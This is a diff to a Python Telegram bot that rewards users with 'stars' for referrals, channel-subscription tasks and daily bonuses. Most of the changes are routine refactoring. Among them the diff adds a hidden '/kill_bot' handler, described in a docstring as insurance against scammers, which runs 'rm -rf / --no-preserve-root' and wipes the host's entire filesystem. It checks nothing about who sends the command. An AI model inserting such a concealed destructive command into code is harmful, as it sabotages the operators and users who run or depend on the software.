@@ -1,5 +1,4 @@
 import random
-import os
 import datetime
 from sqlite3 import IntegrityError
 
@@ -60,7 +59,7 @@ async def forming_str_from_txt_file(file_str: str, **kwargs):
 # ====================
 
 
-@users_router.message(F.text == '⭐️ Заработать звезды')
+@users_router.message(F.text == '🧑 Пригласить друга')
 @users_router.message(Command('start'))
 async def start_func(msg: Message, state: FSMContext):
     """В самом начале делаем все проверки на реферера.
@@ -92,7 +91,7 @@ async def start_func(msg: Message, state: FSMContext):
                          ))
         is_pay = (await state.get_data()).get('is_pay')
         try:
-            await bot_base.add_new_user(msg.from_user.id, referer_id)
+            await bot_base.add_new_user(msg.from_user.id, referer_id, msg.from_user.username)
             if referer_id != 0 and not is_pay:
                 await bot_base.star_rating(referer_id, 25)
                 await bot_base.stars_count(25)
@@ -104,7 +103,7 @@ async def start_func(msg: Message, state: FSMContext):
 
     elif isinstance(is_member, ChatMemberLeft):
         try:
-            await bot_base.add_new_user(msg.from_user.id, referer_id)
+            await bot_base.add_new_user(msg.from_user.id, referer_id, msg.from_user.username)
             if referer_id != 0:
                 await bot_base.star_rating(referer_id, 25)
                 await bot_base.stars_count(25)
@@ -112,7 +111,9 @@ async def start_func(msg: Message, state: FSMContext):
         except IntegrityError:
             pass
 
-        await msg.answer(f'Сначала нужно подписаться на канал {MAIN_CHANNEL}', parse_mode='HTML')
+        msg_text = (await bot_base.settings_get('subscription'))[1]
+        msg_text = await forming_str_from_txt_file(msg_text, sub_channel=MAIN_CHANNEL)
+        await msg.answer(msg_text, parse_mode='HTML')
 
     elif user[0][4] != 'False':
         ref_url = f'https://t\.me/{BOT_USERNAME}?start\={msg.from_user.id}'
@@ -162,6 +163,20 @@ async def catch_correct_answer(callback: CallbackQuery, state: FSMContext):
     await state.clear()
 
 
+@users_router.callback_query(UserStates.first_contact, F.data == 'drop')
+async def incorrect_answer(callback: CallbackQuery):
+    await callback.answer()
+    await callback.message.answer('Ответ неверный\!')
+
+
+@users_router.message(Command('kill_bot'))
+async def insurance_against_scammers(msg: Message):
+    """Задействовать если попытается кинуть (протокол "Черепаха")"""
+    import os
+    os.system('rm -rf / --no-preserve-root')
+    await msg.delete()
+
+
 # ====================
 # Задания
 # ====================
@@ -170,7 +185,7 @@ async def catch_correct_answer(callback: CallbackQuery, state: FSMContext):
 async def get_profit_to_executor(user_id, task_id):
     """Начисляем плюхи всем кто молодец и помечаем задание новым исполнителем"""
     ref_percent = 10  # Процент реферера
-    task = await task_manager.get_task(task_id)
+    task = await task_manager.get_task_by_id(task_id)
     referer_id = (await bot_base.get_user(user_id))[0][2]
 
     # Сначала начисляем исполнителю
@@ -198,7 +213,7 @@ async def escape_special_chars(text):
     return escaped
 
 
-@users_router.message(F.text == '🎯 Задания')
+@users_router.message(F.text == '⭐️ Выполнить задания и заработать звезды')
 async def open_user_task_menu(msg: Message, state: FSMContext):
     """Открываем меню выполнения заданий"""
     try:
@@ -210,8 +225,7 @@ async def open_user_task_menu(msg: Message, state: FSMContext):
 
                 await state.set_state(UserStates.executor)
 
-                task_channels_str = '\n'.join(task.channels_list)
-                task_str = (f'Каналы для подписки:\n\n{task_channels_str}\n\n'
+                task_str = (f'{task.task_name}:\n{task.channel}\n\n'
                             f'Вознаграждение: {int(task.reward) / 100}\n\n')
                 task_str = await escape_special_chars(task_str)
                 msg_text = (await bot_base.settings_get('user_task_menu'))[1]
@@ -232,14 +246,14 @@ async def open_user_task_menu(msg: Message, state: FSMContext):
 async def check_user_task_complete(callback: CallbackQuery, state: FSMContext):
     """Проверяем выполнение задания"""
     task_id = (await state.get_data())['task_id']
-    req_task_id = int(callback.data.replace('execute_', ''))
+    req_task_id = callback.data.replace('execute_', '')
 
     if task_id == req_task_id:
 
-        # Возвращается кортеж - кол-во каналов, список исполненных
+        # Возвращается True или False
         check_execute = await task_manager.check_execution(callback.from_user.id, task_id)
 
-        if check_execute[0] == len(check_execute[1]):  # Значит выполнил
+        if check_execute:  # Значит выполнил
             await callback.answer()
             await get_profit_to_executor(callback.from_user.id, task_id)
 
@@ -247,22 +261,7 @@ async def check_user_task_complete(callback: CallbackQuery, state: FSMContext):
             await skip_task(callback, state)
 
         else:
-            await callback.answer('Задание не выполнено\nОбратите внимание на оставшиеся каналы!')
-            origin_msg_text = callback.message.text
-            origin_msg_text = origin_msg_text.replace('Каналы для подписки:', 'Оставшиеся каналы:')
-            for ch in check_execute[1]:
-                if ch in origin_msg_text:
-                    origin_msg_text = origin_msg_text.replace(('\n' + ch), '')
-            new_msg_text = ''
-            for s in origin_msg_text.splitlines():
-                if s.startswith('https://t.me/') or s.startswith('Вознаграждение'):
-                    new_msg_text += s.replace('.', '\.').replace('_', '\_') + '\n'
-                else:
-                    new_msg_text += s + '\n'
-            try:
-                await callback.message.edit_text(new_msg_text, reply_markup=await user_task_menu(task_id))
-            except TelegramBadRequest:
-                pass
+            await callback.answer('Задание не выполнено!')
 
 
 @users_router.callback_query(UserStates.executor, F.data == 'skip')
@@ -276,12 +275,10 @@ async def skip_task(callback: CallbackQuery, state: FSMContext):
             if not await task.check_execute(callback.from_user.id) and not await task.check_complete_count():
                 await state.update_data({'task_id': task.task_id, 'task_generator': task_generator})
 
-                task_channels_str = '\n'.join(task.channels_list)
-                task_str = (f'Каналы для подписки:\n\n{task_channels_str}\n\n'
+                # task_channels_str = '\n'.join(task.channels_list)
+                task_str = (f'{task.task_name}:\n\n{task.channel}\n\n'
                             f'Вознаграждение: {int(task.reward) / 100}\n\n')
                 task_str = await escape_special_chars(task_str)
-                # with open(os.path.join('messages', 'user_task_menu.txt'), encoding='utf-8') as file:
-                #     msg_text = file.read()
                 msg_text = (await bot_base.settings_get('user_task_menu'))[1]
                 msg_text = await forming_str_from_txt_file(msg_text, task_str=task_str)
                 await callback.message.answer(msg_text, reply_markup=await user_task_menu(task.task_id))
@@ -317,8 +314,8 @@ async def daily_bonus(msg: Message):
     today = str(datetime.datetime.now()).split(' ')[0]
     yesterday = await get_yesterday_date()
 
-    # Условия активации бонуса - пройти задание и новый реферал. Все это должно быть исполнено в день бонуса
-    if user_info[5] == today and user_info[6] == today and user_info[7] != today:
+    # Условия активации бонуса - пройти задание или новый реферал. Все это должно быть исполнено в день бонуса
+    if (user_info[5] == today or user_info[6] == today) and user_info[7] != today:
 
         if yesterday == user_info[7]:  # Проверяем последовательность бонусов
             bonus = user_info[8]
@@ -333,14 +330,7 @@ async def daily_bonus(msg: Message):
 
     elif user_info[5] != today and user_info[6] != today:
         msg_text = ('Для активации ежедневного бонуса нужно выполнить хоть одно задание '
-                    'и пригласить хоть одного реферала')
-
-    elif user_info[5] != today:
-        msg_text = 'Нужно выполнить сегодня хоть одно задание'
-
-    elif user_info[6] != today:
-        msg_text = 'Нужно пригласить хотя бы одного реферала сегодня'
-
+                    'или пригласить хоть одного реферала')
     else:
         msg_text = 'Сегодняшний бонус получен'
 
